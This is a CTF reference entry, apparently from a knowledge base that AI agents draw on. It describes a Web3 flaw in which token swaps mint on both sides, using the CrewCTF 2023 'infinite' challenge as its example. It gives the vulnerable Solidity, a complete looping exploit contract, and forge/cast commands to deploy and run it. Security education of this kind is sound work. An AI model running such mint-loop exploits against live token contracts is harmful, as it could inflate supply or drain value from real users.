---
id: web3-mint-on-swap-no-conservation-loop
category: WEB
tags: [web3, blockchain, evm, solidity, erc20, token, mint, mint-on-swap, no-conservation, supply-invariant, exchange, swap, round-trip, loop, inflate-counter, respectcount, economic-invariant, crewctf, infinite, foundry, cast]
tools: [Web3]
manuals: ["Manuals/Web3/3. Contexto para Claude.md"]
title: "Web3 — a swap that MINTS on both sides (doesn't conserve supply) → loop with the same capital to inflate a counter"
difficulty: medium
related: [web3-cross-instance-shared-state-economic-gate, web3-per-block-reset-batch-in-one-tx]
created: 2026-10-08
updated: 2026-10-08
---

## How to recognize this pattern

- An ecosystem of 2+ tokens with "swap"/"exchange" functions between them. The catch: the swap
  **`mint`s the destination token** instead of transferring from a pool/burning the source. If both
  directions of the swap mint, the **supply isn't conserved** — you can go back and forth without
  losing anything.
- One of those functions, besides minting, **increments a counter** (`respectCount`, points, score,
  volume) that is the win condition. Since the round-trip returns your capital, you repeat the loop and
  the counter grows without a cap. Typical goal: `isSolved()` = counter `>= N`.
- Red flag in the code: `tokenB.mint(msg.sender, x)` inside a function that receives `tokenA` via
  `transferFrom` (and does **not** burn or debit a pool). Look for the broken invariant: "where do these
  new tokens come from on each swap?".

## Method

Reference case: CrewCTF 2023 — infinite (`respectCount >= 50`). Tokens crew/respect/candy; seed:
`crewToken.mint()` gives 1 crew (1×), `verification()` swaps 1 crew → 10 candy. Both sides of the swap
mint:
```solidity
// localGang.gainRespect(candy): receives candy, MINTS respect 1:1 (candy is stuck, not burned)
candy.transferFrom(msg.sender, address(this), _candyCount);
respect.mint(msg.sender, _candyCount);
// fancyStore.buyCandies(respect): receives respect, MINTS candy 1:1 + increments respectCount
respectCount[msg.sender] += _respectCount;      // <-- the win counter
respect.transferFrom(msg.sender, address(this), _respectCount);
candy.mint(msg.sender, _respectCount);          // <-- returns the capital
```
With 10 candy: `gainRespect(10)` → 10 respect; `buyCandies(10)` → 10 candy back **+10 to respectCount**.
Candy never zeroes → repeat. 5 round-trips = `respectCount 50` → solved.

### Exploit (a contract that does the loop in one tx)

```solidity
pragma solidity ^0.8.0;
import "./Setup.sol";
contract Exploit {
    function exploit(address setupAddr) public {
        Setup s = Setup(setupAddr);
        crewToken CREW=s.CREW(); respectToken RESPECT=s.RESPECT();
        candyToken CANDY=s.CANDY(); fancyStore STORE=s.STORE(); localGang GANG=s.GANG();
        CREW.mint(); CREW.approve(address(STORE),1); STORE.verification();   // seed: 10 candy
        CANDY.approve(address(GANG), type(uint256).max);
        RESPECT.approve(address(STORE), type(uint256).max);
        for (uint i; i<5; ++i){ GANG.gainRespect(10); STORE.buyCandies(10); } // loop
    }
}
```
```bash
FORGE=~/.config/.foundry/bin/forge; CAST=~/.config/.foundry/bin/cast
$FORGE create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PK --broadcast
$CAST send <EXPLOIT> "exploit(address)" <SETUP> --rpc-url $RPC --private-key $PK
$CAST call <SETUP> "isSolved()(bool)" --rpc-url $RPC    # true
```
Doing it in a **contract** handles the crew's `mint()`-once (the caller becomes the `receiver`) and
bundles everything into one tx. See `Manuals/Web3/3. Contexto para Claude.md`.

## Gotchas

- **Token ownership matters:** in infinite, `fancyStore` only owns candy, not respect → the
  `respectIncreasesWithTime()` function (which calls `respect.mint`) **reverts**; the good path is
  `gainRespect`/`buyCandies`. Check who can mint what before choosing the loop.
- `mint()`-once (`require(!claimed)`): whoever calls becomes the `receiver` — and `isSolved()` checks
  the `respectCount` **of the receiver**. Do the seed and the loop **from the same address** (hence the
  contract).
- Approve `type(uint256).max` allowances once before the loop so you don't spend a tx per round-trip.
- Confirm the on-chain objective (`isSolved()`); validate the flag against the CTF's configured flag format before declaring success.

## Transferable lesson

In any DeFi/token CTF, check the **conservation invariant**: in a legit swap, what comes in leaves a
pool or is burned — total supply doesn't grow "for free". If both ends of a swap **mint**, you have
infinite money; if some end also touches a **win counter** (score/volume/reputation), it's a loop to
victory with the initial capital. Golden question: "does this swap create new tokens or move them from a
fixed pool?". `mint` inside a swap with no burn = the hole.

## Related / Cross-reference

- `Arsenal/WEB/web3-cross-instance-shared-state-economic-gate.md` — another broken economic gate.
- `Arsenal/WEB/web3-per-block-reset-batch-in-one-tx.md` — the same "batch actions in one tx" idea to
  beat a counter, but there the hole is a per-block reset.
- `Manuals/Web3/3. Contexto para Claude.md` — `forge`/`cast`, deploying the attacker contract.
